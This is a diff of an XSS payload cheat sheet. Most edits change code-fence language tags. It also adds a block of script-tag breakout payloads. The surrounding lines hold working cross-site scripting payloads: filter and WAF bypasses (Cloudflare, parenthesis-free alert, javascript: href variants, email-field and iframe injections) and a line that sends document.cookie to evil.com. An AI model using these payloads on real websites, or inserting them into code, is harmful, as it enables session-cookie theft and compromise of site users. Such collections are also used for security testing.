@@ -43,7 +43,7 @@ fetch(`//evil.com/?c=${document.cookie}`)
 
 ### Href
 
-```js
+```html
 <!--javascript -->
 javascript:alert(1)
 JaVaScript:alert(1)
@@ -97,14 +97,14 @@ javascript:\u0061\u006C\u0065\u0072\u0074``
 ```
 
 ### Email 
-```js
+```html
 test+(<script>alert(0)</script>)@example.com
 test@example(<script>alert(0)</script>).com
 "<script>alert(0)</script>"@example.com
 ```
 
 ### Iframe
-```js
+```html
 <iframe src="javascript:alert('XSS')"> #use href bypass
 <iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
 <iframe src="https://google.com@evil.domain">
@@ -112,30 +112,30 @@ test@example(<script>alert(0)</script>).com
 ```
 
 ### Without Space
-```js
+```html
 <img/src/onerror=alert(1)>
 <svg/onload=alert(2)>
 ```
 
 ### Without dot 
-```js
+```html
 <script src=//0x8ac5c30a>
 ```
 
 ### Without parentheses
-```
+```js
 alert`45`
 document.location="javascript:alert%2845%29"
 onerror=alert;throw 45
 ```
 https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
 
-```
+```js
 <svg/onload='alert&#40 23 &#41'> 
 location=/javascript:alert%2823%29/.source;
 ```
 ### 20 Chars MAX: 
-https://jlajara.gitlab.io/XSS_20_characters
+[https://jlajara.gitlab.io/XSS_20_characters](https://jlajara.gitlab.io/XSS_20_characters)
 
 ### Some random payloads
 ```js
@@ -155,7 +155,7 @@ https://jlajara.gitlab.io/XSS_20_characters
 ### In JS Injection Bypass
 
 #### With <!-- <script/
-```html
+```js
 <script>
   var test = "injection <!-- <script/";
 </script>
@@ -168,15 +168,45 @@ https://jlajara.gitlab.io/XSS_20_characters
   var test = "</script><svg/onload=alert(45)>"
 </script>
 ```
-#### With double quot and plus (same for simple quotes)
+
+#### With </script Space, tab, strings, line return...
+```js
+<script>
+  var test = "</script ><svg/onload=alert(45)>"
+</script>
+
+<script>
+  var test = "</script  ><svg/onload=alert(45)>"
+</script>
+
+<script>
+  var test = "</script random><svg/onload=alert(45)>"
+</script>
+
+<script>
+  var test = "</script
+random><svg/onload=alert(45)>"
+</script>
+
+<script>
+  var test = "</script 
+random><svg/onload=alert(45)>"
+</script>
+
+<script>
+  var test = "</script <img><svg/onload=alert(45)>"
+</script>
 ```
+
+#### With double quot and plus (same for simple quotes)
+```js
 <script>
   var test = ""+alert(45)+""
   // user input: "+alert(45)+"
 </script>
 ```
 #### With backslash
-```
+```js
 <script>
   var test = "\", test1="+alert(45)//input2"
   // Original: var test = "input1", test1="input2"
@@ -185,8 +215,9 @@ https://jlajara.gitlab.io/XSS_20_characters
 </script>
 ```
 
+
 ### 302 XSS 
-```
+```js
 ws://google.com"><svg/onload=alert(2)>
 wss://google.com"><svg/onload=alert(2)>
 resource://google.com"><svg/onload=alert(2)>
@@ -301,7 +332,7 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limitation/
 
 ### Bypass Cloudflare
-```
+```html
 <img//////src=x oNlY=1 oNerror=alert('xxs')//
 <img src=x on onerror=alert()>
 ```
